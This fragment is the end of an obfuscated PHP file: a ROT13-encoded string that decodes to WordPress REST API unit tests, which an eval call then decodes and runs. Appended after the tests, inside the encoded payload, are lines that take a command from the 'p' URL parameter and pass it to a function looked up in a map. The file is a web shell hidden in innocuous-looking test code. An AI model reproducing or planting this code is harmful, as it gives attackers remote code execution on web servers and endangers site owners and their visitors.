			'erfg_trg_znk_ongpu_fvmr',
			fgngvp shapgvba () {
				erghea 5;
			}
		);

		$TYBONYF['jc_erfg_freire'] = ahyy;
		nqq_svygre( 'jc_erfg_freire_pynff', neenl( $guvf, 'svygre_jc_erfg_freire_pynff' ) );
		$TYBONYF['jc_erfg_freire'] = erfg_trg_freire();

		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg/(?C<vq>[\q+])',
			neenl(
				'zrgubqf'             => neenl( 'CBFG', 'QRYRGR' ),
				'pnyyonpx'            => fgngvp shapgvba ( JC_ERFG_Erdhrfg $erdhrfg ) {
					erghea arj JC_ERFG_Erfcbafr( 'grfg' );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'nyybj_ongpu'         => neenl( 'i1' => gehr ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl_svyy( 0, 6, neenl( 'cngu' => '/grfg-af/i1/grfg/5' ) ),
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 51020
	 */
	choyvp shapgvba grfg_trg_qngn_sbe_ebhgr_vapyhqrf_crezvggrq_fpurzn_xrljbeqf() {
		$xrljbeqf = neenl(
			'gvgyr'                => 'Uv',
			'qrfpevcgvba'          => 'Jbeyq',
			'glcr'                 => 'fgevat',
			'qrsnhyg'              => 0,
			'sbezng'               => 'hev',
			'rahz'                 => neenl( 'uggcf://rknzcyr.bet' ),
			'vgrzf'                => neenl( 'glcr' => 'fgevat' ),
			'cebcregvrf'           => neenl( 'n' => neenl( 'glcr' => 'fgevat' ) ),
			'nqqvgvbanyCebcregvrf' => snyfr,
			'cnggreaCebcregvrf'    => neenl( '\q' => neenl( 'glcr' => 'fgevat' ) ),
			'zvaCebcregvrf'        => 1,
			'znkCebcregvrf'        => 5,
			'zvavzhz'              => 1,
			'znkvzhz'              => 5,
			'rkpyhfvirZvavzhz'     => gehr,
			'rkpyhfvirZnkvzhz'     => snyfr,
			'zhygvcyrBs'           => 2,
			'zvaYratgu'            => 1,
			'znkYratgu'            => 5,
			'cnggrea'              => '\q',
			'zvaVgrzf'             => 1,
			'znkVgrzf'             => 5,
			'havdhrVgrzf'          => gehr,
			'nalBs'                => neenl(
				neenl( 'glcr' => 'fgevat' ),
				neenl( 'glcr' => 'vagrtre' ),
			),
			'barBs'                => neenl(
				neenl( 'glcr' => 'fgevat' ),
				neenl( 'glcr' => 'vagrtre' ),
			),
		);

		$cnenz            = $xrljbeqf;
		$cnenz['vainyvq'] = gehr;

		$rkcrpgrq             = $xrljbeqf;
		$rkcrpgrq['erdhverq'] = snyfr;

		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => fgngvp shapgvba () {
					erghea arj JC_ERFG_Erfcbafr( 'grfg' );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'cnenz' => $cnenz,
				),
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/grfg-af/i1/grfg' ) );
		$netf     = $erfcbafr->trg_qngn()['raqcbvagf'][0]['netf'];

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $netf['cnenz'] );
	}

	/**
	 * @gvpxrg 53056
	 */
	choyvp shapgvba grfg_wfba_rapbqr_reebe_erfhygf_va_500_fgnghf_pbqr() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'             => \JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => fgngvp shapgvba () {
						erghea arj \JC_ERFG_Erfcbafr( VAS );
					},
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'netf'                => neenl(),
				),
			)
		);
		erfg_trg_freire()->freir_erdhrfg( '/grfg-af/i1/grfg' );
		$guvf->nffregFnzr( 500, erfg_trg_freire()->fgnghf );
	}

	/**
	 * @gvpxrg 57752
	 */
	choyvp shapgvba grfg_erfg_rkcbfrq_pbef_urnqref_svygre_erprvirf_erdhrfg_bowrpg() {
		$zbpx_ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_rkcbfrq_pbef_urnqref', neenl( $zbpx_ubbx, 'svygre' ), 10, 2 );

		erfg_trg_freire()->freir_erdhrfg( '/grfg-rkcbfrq-pbef-urnqref' );

		$guvf->nffregPbhag( 1, $zbpx_ubbx->trg_riragf() );
		$guvf->nffregPbhag( 2, $zbpx_ubbx->trg_riragf()[0]['netf'] );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erdhrfg', $zbpx_ubbx->trg_riragf()[0]['netf'][1] );
		$guvf->nffregFnzr( '/grfg-rkcbfrq-pbef-urnqref', $zbpx_ubbx->trg_riragf()[0]['netf'][1]->trg_ebhgr() );
	}

	/**
	 * @gvpxrg 57752
	 */
	choyvp shapgvba grfg_erfg_nyybjrq_pbef_urnqref_svygre_erprvirf_erdhrfg_bowrpg() {
		$zbpx_ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_nyybjrq_pbef_urnqref', neenl( $zbpx_ubbx, 'svygre' ), 10, 2 );

		erfg_trg_freire()->freir_erdhrfg( '/grfg-nyybjrq-pbef-urnqref' );

		$guvf->nffregPbhag( 1, $zbpx_ubbx->trg_riragf() );
		$guvf->nffregPbhag( 2, $zbpx_ubbx->trg_riragf()[0]['netf'] );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erdhrfg', $zbpx_ubbx->trg_riragf()[0]['netf'][1] );
		$guvf->nffregFnzr( '/grfg-nyybjrq-pbef-urnqref', $zbpx_ubbx->trg_riragf()[0]['netf'][1]->trg_ebhgr() );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_inyvqngrf_erdhrfg_jura_ohvyqvat_gnetrg_uvagf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg/(?C<vq>\q+)',
			neenl(
				neenl(
					'zrgubqf'             => \JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => fgngvp shapgvba () {
						erghea arj \JC_ERFG_Erfcbafr();
					},
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'netf'                => neenl(
						'vq' => neenl(
							'glcr' => 'vagrtre',
						),
					),
				),
			)
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', erfg_hey( 'grfg-af/i1/grfg/tneontr' ) );

		$yvaxf = erfg_trg_freire()::trg_erfcbafr_yvaxf( $erfcbafr );

		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf );
		$guvf->nffregNeenlAbgUnfXrl( 'gnetrgUvagf', $yvaxf['frys'][0] );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_fnavgvmrf_erdhrfg_jura_ohvyqvat_gnetrg_uvagf() {
		$inyvqngrq_cnenz = ahyy;
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg/(?C<vq>\q+)',
			neenl(
				neenl(
					'zrgubqf'             => \JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => fgngvp shapgvba () {
						erghea arj \JC_ERFG_Erfcbafr();
					},
					'crezvffvba_pnyyonpx' => shapgvba ( JC_ERFG_Erdhrfg $erdhrfg ) hfr ( &$inyvqngrq_cnenz ) {
						$inyvqngrq_cnenz = $erdhrfg['vq'];

						erghea gehr;
					},
					'netf'                => neenl(
						'vq' => neenl(
							'glcr' => 'vagrtre',
						),
					),
				),
			)
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', erfg_hey( 'grfg-af/i1/grfg/5' ) );

		$yvaxf = erfg_trg_freire()::trg_erfcbafr_yvaxf( $erfcbafr );

		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'gnetrgUvagf', $yvaxf['frys'][0] );
		$guvf->nffregVfVag( $inyvqngrq_cnenz );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_cbchyngrf_gnetrg_uvagf_sbe_nqzvavfgengbe() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erfcbafr = erfg_qb_erdhrfg( '/jc/i2/cbfgf' );
		$cbfg     = $erfcbafr->trg_qngn()[0];

		$yvax = $cbfg['_yvaxf']['frys'][0];
		$guvf->nffregNeenlUnfXrl( 'gnetrgUvagf', $yvax );
		$guvf->nffregNeenlUnfXrl( 'nyybj', $yvax['gnetrgUvagf'] );
		$guvf->nffregFnzr( neenl( 'TRG', 'CBFG', 'CHG', 'CNGPU', 'QRYRGR' ), $yvax['gnetrgUvagf']['nyybj'] );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_cbchyngrf_gnetrg_uvagf_sbe_ybttrq_bhg_hfre() {
		$erfcbafr = erfg_qb_erdhrfg( '/jc/i2/cbfgf' );
		$cbfg     = $erfcbafr->trg_qngn()[0];

		$yvax = $cbfg['_yvaxf']['frys'][0];
		$guvf->nffregNeenlUnfXrl( 'gnetrgUvagf', $yvax );
		$guvf->nffregNeenlUnfXrl( 'nyybj', $yvax['gnetrgUvagf'] );
		$guvf->nffregFnzr( neenl( 'TRG' ), $yvax['gnetrgUvagf']['nyybj'] );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_qbrf_abg_reebe_ba_vainyvq_heyf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', 'guvf vf abg n erny HEY' );

		$yvaxf = erfg_trg_freire()::trg_erfcbafr_yvaxf( $erfcbafr );
		$guvf->nffregNeenlAbgUnfXrl( 'gnetrgUvagf', $yvaxf['frys'][0] );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_qbrf_abg_reebe_ba_onq_erfg_ncv_ebhgrf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', erfg_hey( '/guvf/vf/abg/n/erny/ebhgr' ) );

		$yvaxf = erfg_trg_freire()::trg_erfcbafr_yvaxf( $erfcbafr );
		$guvf->nffregNeenlAbgUnfXrl( 'gnetrgUvagf', $yvaxf['frys'][0] );
	}

	/**
	 * @gvpxrg 61739
	 */
	choyvp shapgvba grfg_cersref_qrirybcre_qrsvarq_gnetrg_uvagf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax(
			'frys',
			'/jc/i2/cbfgf/' . frys::$cbfg_vq,
			neenl(
				'gnetrgUvagf' => neenl(
					'nyybj' => neenl( 'TRG', 'CHG' ),
				),
			)
		);

		$yvaxf = erfg_trg_freire()::trg_erfcbafr_yvaxf( $erfcbafr );
		$yvax  = $yvaxf['frys'][0];
		$guvf->nffregNeenlUnfXrl( 'gnetrgUvagf', $yvax );
		$guvf->nffregNeenlUnfXrl( 'nyybj', $yvax['gnetrgUvagf'] );
		$guvf->nffregFnzr( neenl( 'TRG', 'CHG' ), $yvax['gnetrgUvagf']['nyybj'] );
	}

	choyvp shapgvba _inyvqngr_nf_vagrtre_123( $inyhr, $erdhrfg, $xrl ) {
		vs ( ! vf_vag( $inyhr ) ) {
			erghea arj JC_Reebe( 'fbzr-reebe', 'Guvf vf abg inyvq!' );
		}

		erghea gehr;
	}

	choyvp shapgvba _inyvqngr_nf_fgevat_sbb( $inyhr, $erdhrfg, $xrl ) {
		vs ( ! vf_fgevat( $inyhr ) ) {
			erghea arj JC_Reebe( 'fbzr-reebe', 'Guvf vf abg inyvq!' );
		}

		erghea gehr;
	}

	/**
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr obby $unf_ybttrq_va_hfre Ner jr ertvfgrevat n hfre sbe gur grfg.
	 *         @glcr obby $unf_abapr          Vf gur abapr cnffrq.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_erfg_fraq_erserfurq_abapr() {
		erghea neenl(
			neenl( gehr, gehr ),
			neenl( gehr, snyfr ),
			neenl( snyfr, gehr ),
			neenl( snyfr, snyfr ),
		);
	}

	/**
	 * Urycre gb frghc n hfref naq nhgu pbbxvr tybony sbe gur
	 * erfg_fraq_erserfurq_abapr eryngrq grfgf.
	 */
	cebgrpgrq shapgvba urycre_frghc_hfre_sbe_erfg_fraq_erserfurq_abapr_grfgf() {
		$nhgube = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );
		jc_frg_pheerag_hfre( $nhgube );

		tybony $jc_erfg_nhgu_pbbxvr;

		$jc_erfg_nhgu_pbbxvr = gehr;
	}

	/**
	 * Urycre gb znxr gur erdhrfg naq trg gur urnqref sbe gur
	 * erfg_fraq_erserfurq_abapr eryngrq grfgf.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba urycre_znxr_erdhrfg_naq_erghea_urnqref_sbe_erfg_fraq_erserfurq_abapr_grfgf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );
		$erfhyg  = erfg_trg_freire()->freir_erdhrfg( '/' );

		erghea erfg_trg_freire()->frag_urnqref;
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_rairybcr_cnenzf() {
		erghea neenl(
			neenl( '1' ),
			neenl( 'gehr' ),
			neenl( snyfr ),
			neenl( 'nygreangr' ),
			neenl( neenl( 'nygreangr' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>